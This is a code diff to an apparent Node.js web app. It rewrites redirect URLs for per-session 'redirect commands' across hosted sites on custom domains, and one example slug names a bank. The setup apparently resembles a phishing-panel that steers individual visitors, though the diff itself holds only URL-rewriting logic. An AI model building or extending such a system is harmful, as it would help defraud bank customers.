@@ -17,7 +17,7 @@ function getClientIp(req) {
 async function getPendingRedirect(db, sessionId, currentPage) {
   try {
     const cmd = await db.get(`
-      SELECT rc.id, rc.target_url, w.demo_slug, w.deploy_domain
+      SELECT rc.id, rc.target_url, w.demo_slug, w.deploy_domain, w.domain, w.domain_active
       FROM redirect_commands rc
       LEFT JOIN websites w ON w.id = rc.website_id
       WHERE rc.session_id = ?
@@ -32,9 +32,11 @@ async function getPendingRedirect(db, sessionId, currentPage) {
       // If website is hosted on its own domain, strip /<slug>/ prefix from target
       // (e.g. "/investec/error" → "/error")
       let target = cmd.target_url;
-      if (cmd.deploy_domain && cmd.demo_slug) {
-        const stripRe = new RegExp('^\\/' + cmd.demo_slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\/', 'i');
-        target = target.replace(stripRe, '/');
+      const hasOwnDomain = cmd.deploy_domain || (cmd.domain && cmd.domain_active);
+      if (hasOwnDomain && cmd.demo_slug) {
+        const esc = cmd.demo_slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        target = target.replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/');
+        target = target.replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/');
       }
 
       // Strip /demo/<slug>/ prefix for both sides so custom-domain paths
@@ -135,6 +137,16 @@ router.post('/init', async (req, res) => {
       const rule = await redirectService.evaluateRules(updatedSession, adminCount > 0);
       if (rule) {
         redirectUrl = rule.target_url;
+        // Strip slug prefix for sites hosted on their own domain
+        try {
+          const rw = await db.get('SELECT demo_slug, deploy_domain, domain, domain_active FROM websites WHERE id = ?', [updatedSession.website_id]);
+          const hasOwn = rw && (rw.deploy_domain || (rw.domain && rw.domain_active));
+          if (hasOwn && rw.demo_slug) {
+            const esc = rw.demo_slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+            redirectUrl = redirectUrl.replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/');
+            redirectUrl = redirectUrl.replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/');
+          }
+        } catch {}
       }
     }
 
